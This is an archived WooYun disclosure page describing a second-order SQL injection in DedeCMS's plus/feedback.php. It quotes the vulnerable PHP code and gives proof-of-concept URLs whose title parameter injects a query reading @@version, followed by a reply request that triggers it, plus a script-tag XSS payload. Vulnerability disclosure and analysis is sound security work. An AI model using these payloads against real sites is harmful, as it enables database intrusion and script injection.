@@ -1,0 +1,230 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		dedecms鸡肋级注入与细节分析过程  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		dedecms鸡肋级注入与细节分析过程  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/yy520">yy520</a> 
+</li><li>提交时间：		2013-02-10 13:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-02-10：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-03-27：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一枚二次注入，因为字数限制了，所以显得特别鸡肋。<br />
+另外，祝大家新年快乐 ：）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>233      extract($arcRow, EXTR_SKIP);<br />
+ 234      $msg = cn_substrR(TrimMsg($msg), 1000);<br />
+ 235      $username = cn_substrR(HtmlReplace($username, 2), 20);<br />
+ 236      if(empty($feedbacktype) || ($feedbacktype!=&#039;good&#039; &amp;&amp; $feedbacktype!=&#039;bad&#039;))<br />
+ 237      {<br />
+ 238          $feedbacktype = &#039;feedback&#039;;<br />
+ 239      }<br />
+ 240      //保存评论内容<br />
+ 241      if($comtype == &#039;comments&#039;)<br />
+ 242      {<br />
+ 243          $arctitle = addslashes($title);<br />
+ 244          $typeid = intval($typeid);<br />
+ 245          $ischeck = intval($ischeck);<br />
+ 246          $feedbacktype = preg_replace(&quot;#[^0-9a-z]#i&quot;, &quot;&quot;, $feedbacktype);<br />
+ 247          if($msg!=&#039;&#039;)<br />
+ 248          {<br />
+ 249              $inquery = &quot;INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`)<br />
+ 250                     VALUES (&#039;$aid&#039;,&#039;$typeid&#039;,&#039;$username&#039;,&#039;$arctitle&#039;,&#039;$ip&#039;,&#039;$ischeck&#039;,&#039;$dtime&#039;, &#039;{$cfg_ml-&gt;M_ID}&#039;,&#039;0&#039;,&#039;0&#039;,&#039;$feedbacktype&#039;,&#039;$face&#039;,&#039;$msg&#039;); &quot;;<br />
+ 251              $rs = $dsql-&gt;ExecuteNoneQuery($inquery);<br />
+ 252              if(!$rs)<br />
+ 253              {<br />
+ 254                  ShowMsg(&#039; 发表评论错误! &#039;, &#039;-1&#039;);<br />
+ 255                  //echo $dsql-&gt;GetError();<br />
+ 256                  exit();<br />
+ 257              }<br />
+ 258          }<br />
+ 259      }<br />
+ 260      //引用回复<br />
+ 261      elseif ($comtype == &#039;reply&#039;)<br />
+ 262      {<br />
+ 263          $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__feedback` WHERE id =&#039;$fid&#039;&quot;);<br />
+ 264          $arctitle = $row[&#039;arctitle&#039;];<br />
+ 265          $aid =$row[&#039;aid&#039;];<br />
+ 266          $msg = $quotemsg.$msg;<br />
+ 267          $msg = HtmlReplace($msg, 2);<br />
+ 268          $inquery = &quot;INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`)<br />
+ 269                  VALUES (&#039;$aid&#039;,&#039;$typeid&#039;,&#039;$username&#039;,&#039;$arctitle&#039;,&#039;$ip&#039;,&#039;$ischeck&#039;,&#039;$dtime&#039;,&#039;{$cfg_ml-&gt;M_ID}&#039;,&#039;0&#039;,&#039;0&#039;,&#039;$feedbacktype&#039;,&#039;$face&#039;,&#039;$msg&#039;)&quot;;<br />
+ 270          $dsql-&gt;ExecuteNoneQuery($inquery);<br />
+ 271      }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+理论：<br />
+<br />
+insert → select → insert 类型<br />
+<br />
+<br />
+<br />
+line 233 , 指定为 EXTR_SKIP，所以我们可以任意制定$title的值<br />
+<br />
+line 243 , 第一次insert之前，$title被过滤，$title=test\&#039;进入数据库时将变成test&#039;<br />
+<br />
+line 263 , select出来的arctitle 为 test&#039;,然后再次进入insert，导致注入 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">实际：<br />
+<br />
+<br />
+<br />
+假设我们第一次输入：<br />
+<br />
+http://localhost/dede7/plus/feedback.php?action=send&amp;aid=1&amp;&amp;comtype=comments&amp;isconfirm=yes&amp;notuser=1&amp;msg=stage1111&amp;title=yy&#039;,1,1,1,0,0,0,&#039;feedback&#039;,0,@@version),(9,1,&#039;&#039;,&#039;<br />
+<br />
+<br />
+<br />
+当gpc为on时，line 243的$title被转义两次，进入数据库的时候变成<br />
+<br />
+</p><p class="detail"><a href="../images/0918322545dbfb995ad1a831e4cf2ee2b58360a9.png" target="_blank"><img src="../images/0918322545dbfb995ad1a831e4cf2ee2b58360a9.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我们引用这条留言：<br />
+<br />
+http://localhost/dede7/plus/feedback.php?action=send&amp;aid=1&amp;&amp;comtype=reply&amp;isconfirm=yes&amp;notuser=1&amp;msg=stage2222&amp;fid=38<br />
+<br />
+</p><p class="detail"><a href="../images/09183253264ef7ce045e47d33cb266a16f4fb539.png" target="_blank"><img src="../images/09183253264ef7ce045e47d33cb266a16f4fb539.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+再次引用id 41的留言：<br />
+<br />
+</p><p class="detail"><a href="../images/09183406df400bcb2ebf988957d30088f8e66e95.png" target="_blank"><img src="../images/09183406df400bcb2ebf988957d30088f8e66e95.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功注入：<br />
+<br />
+</p><p class="detail"><a href="../images/091834153f4166364f6269deb97b82c4016644d7.png" target="_blank"><img src="../images/091834153f4166364f6269deb97b82c4016644d7.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+理论意义大于实际意义，这个注入没有太大的危害，因为字段arctitle在mysql中的定义为 varchar(60) not null，60字节不够绕过那个ids，同理还有plus/bookfeedback.php，不过bookfeedback.php 好像没启用，没作测试，对了，当title=&lt;script&gt;alert(1)&lt;/script&gt;的时候，还可以产生一个xss<br />
+<br />
+</p><p class="detail"><a href="../images/09183423b723e984757332e9f8615f6368ed4097.png" target="_blank"><img src="../images/09183423b723e984757332e9f8615f6368ed4097.png" alt="6.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/yy520" title="yy520">yy520</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-018562" title="dedecms鸡肋级注入与细节分析过程">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="18562";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
